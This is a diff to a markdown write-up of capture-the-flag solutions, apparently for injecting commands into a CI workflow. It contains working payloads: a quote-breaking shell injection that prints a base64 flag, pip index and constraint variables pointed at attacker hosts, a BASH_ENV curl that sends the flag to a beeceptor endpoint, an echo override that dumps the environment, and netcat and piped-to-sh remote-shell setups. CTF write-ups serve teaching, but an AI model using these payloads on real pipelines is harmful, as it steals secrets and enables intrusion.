@@ -1,28 +1,64 @@
+
+<!-- TABLE OF CONTENTS -->
+<details>
+  <summary>Table of Contents</summary>
+  <ol>
+    <li>
+      <a href="#chall 1">Challenge 1</a>
+    </li>
+    <li>
+      <a href="#getting-started">Challenge 2</a>
+      <ul>
+        <li><a href="#prerequisites">Solution 1</a></li>
+        <li><a href="#installation">Solution 2</a></li>
+      </ul>
+    </li>
+    <li>
+      <a href="#getting-started">Challenge 2</a>
+      <ul>
+        <li><a href="#prerequisites">Solution 1</a></li>
+        <li><a href="#installation">Solution 2</a></li>
+      </ul>
+    </li>
+  </ol>
+</details>
+
 # Chall 1
  
 ``` bash
 Hello, there!'; echo "Here is your flag: ${FLAG}" | base64 ;echo 'General Kenobi
 ```
- 
+
+
+
+
+
+
 # Chall 2
 ## Solution 1
-[PIP environment variables doc](https://pip.pypa.io/en/latest/cli/pip_install/) PIP_<UPPER_LONG_NAME>
-
-[Pypi PyYAML](https://pypi.org/project/PyYAML/)
-
-[Cloudsmith](https://cloudsmith.io/~nebco/packages/)
+> [!NOTE]
+> - [PIP environment variables doc](https://pip.pypa.io/en/latest/cli/pip_install/) PIP_<UPPER_LONG_NAME>
+> - [Pypi PyYAML](https://pypi.org/project/PyYAML/)
+> - [Cloudsmith](https://cloudsmith.io/~nebco/packages/)
 ``` bash
 Not a release :(
 PIP_INDEX_URL=https://cloudsmith.io/~nebco/packages/#
 ```
-Alternatives to cloudsmith :
-- Host your own registry server (local, AWS or other...)
-- Use github pages
+> [!TIP]
+> Alternatives to cloudsmith :
+> - Host your own registry (local, AWS or other...)
+> - Use github pages
+>
+> Sometimes indentation doesn't work when commenting on an exit. It is therefore preferable to use `Github CLI` directly and push a file. `gh issue comment <id_issue> -F <file_name>`
+
+
+
+
 
 ## Solution 2
-[Beeceptor](https://beeceptor.com/)
-
-[Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
+> [!NOTE]
+> - [Beeceptor](https://beeceptor.com/)
+> - [Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
 
 Configure Beeceptor :
 - Add new "Mocking Rules"
@@ -34,17 +70,25 @@ Not a release :(
 PIP_CONSTRAINT=https://tdf123456.free.beeceptor.com/get-flag
 ```
 
+
+
+
+
 # Chall 3
 ## Solution 1
-> [!TIP]
-> [Bash variables doc](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
-> [Beeceptor](https://beeceptor.com/)
-> [Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
+> [!NOTE]
+> - [Bash variables doc](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
+> - [Beeceptor](https://beeceptor.com/)
+> - [Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
  
 ``` bash
 Not a release :(
 BASH_ENV=$(curl https://tdf123456.free.beeceptor.com?flag=$(echo "$FLAG" | base64))
 ```
+
+
+
+
 
 ## Solution 2
 ``` bash
@@ -52,10 +96,12 @@ Not a release :(
 BASH_FUNC_echo%%=() { builtin echo "coucou $@" | printenv | base64 ;}
 ```
  
+
+
+
+
 # Chall 4
- 
 ## Setup (client side)
- 
 ### Listen with NC
 
 ``` bash
@@ -90,6 +136,10 @@ curl -sSf https://sshx.io/get | sh -s run
  
 The directory `/home/runner/work/_temp` look interesting...
  
+
+
+
+
 # Chall 5
  
 ### Listen with NC
